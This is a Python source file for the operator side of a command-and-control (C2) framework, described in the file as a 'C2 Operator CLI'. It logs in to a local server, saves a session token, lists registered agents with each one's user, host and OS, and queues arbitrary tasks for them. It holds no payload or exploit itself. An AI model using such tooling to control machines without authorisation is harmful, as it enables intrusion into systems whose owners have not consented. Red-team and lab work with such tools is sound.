import argparse
import getpass
import json
import os
import sys

import requests

SERVER_URL = "http://127.0.0.1:5000"
TOKEN_FILE = os.path.join(os.path.dirname(__file__), ".operator_token")


# ── Token management ──────────────────────────────────────────────────────────

def _save_token(token: str):
    with open(TOKEN_FILE, "w") as f:
        f.write(token)
    os.chmod(TOKEN_FILE, 0o600)


def _load_token() -> str | None:
    try:
        with open(TOKEN_FILE) as f:
            return f.read().strip() or None
    except FileNotFoundError:
        return None


def _auth_headers() -> dict:
    token = _load_token()
    if not token:
        print("[!] Not logged in. Run: python3 -m controller.operator login")
        sys.exit(1)
    return {"Authorization": f"Bearer {token}"}


def _handle_unauth(r: requests.Response):
    if r.status_code == 401:
        print("[!] Token invalid or expired. Run: python3 -m controller.operator login")
        sys.exit(1)


# ── Commands ──────────────────────────────────────────────────────────────────

def do_login(args):
    username = input("Username: ").strip()
    password = getpass.getpass("Password: ")
    r = requests.post(f"{SERVER_URL}/api/login", json={"username": username, "password": password})
    if r.status_code == 200:
        token = r.json().get("token")
        _save_token(token)
        print("[+] Login successful. Token saved.")
    else:
        try:
            print("[-] Login failed:", r.json().get("error", r.text))
        except Exception:
            print("[-] Login failed:", r.text)


def do_logout(args):
    if os.path.exists(TOKEN_FILE):
        os.remove(TOKEN_FILE)
    print("[+] Logged out.")


def list_agents(args):
    r = requests.get(f"{SERVER_URL}/api/agents", headers=_auth_headers())
    _handle_unauth(r)
    r.raise_for_status()
    agents = r.json()

    if not agents:
        print("No agents registered")
        return

    for aid, meta in agents.items():
        print(f"{aid}")
        print(f"  user:      {meta.get('user')}")
        print(f"  host:      {meta.get('hostname')}")
        print(f"  os:        {meta.get('os')}")
        print(f"  status:    {meta.get('status')}")
        print(f"  last_seen: {meta.get('last_seen')}")
        print()


def push_task(agent_id, task_obj):
    payload = {
        "id": agent_id,
        "task": json.dumps(task_obj)
    }
    r = requests.post(f"{SERVER_URL}/api/push", json=payload, headers=_auth_headers())
    _handle_unauth(r)
    if r.status_code != 200:
        try:
            print("Error:", r.json())
        except Exception:
            print("Error:", r.text)
        return
    print(f"Structured task queued for {agent_id}")


# ── Entry point ───────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="C2 Operator CLI")
    sub = parser.add_subparsers(dest="cmd")

    sub.add_parser("login",  help="Authenticate and store a session token")
    sub.add_parser("logout", help="Remove the stored session token")
    sub.add_parser("agents", help="List registered agents")

    exec_p = sub.add_parser("exec", help="Push a task to an agent")
    exec_p.add_argument("agent_id")
    exec_p.add_argument("task_type")
    exec_p.add_argument("--args", default="{}")

    args = parser.parse_args()

    if args.cmd == "login":
        do_login(args)
    elif args.cmd == "logout":
        do_logout(args)
    elif args.cmd == "agents":
        list_agents(args)
    elif args.cmd == "exec":
        try:
            task_args = json.loads(args.args)
        except json.JSONDecodeError:
            print("Invalid JSON for --args")
            return

        task_obj = {
            "type": args.task_type,
            "args": task_args
        }
        push_task(args.agent_id, task_obj)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
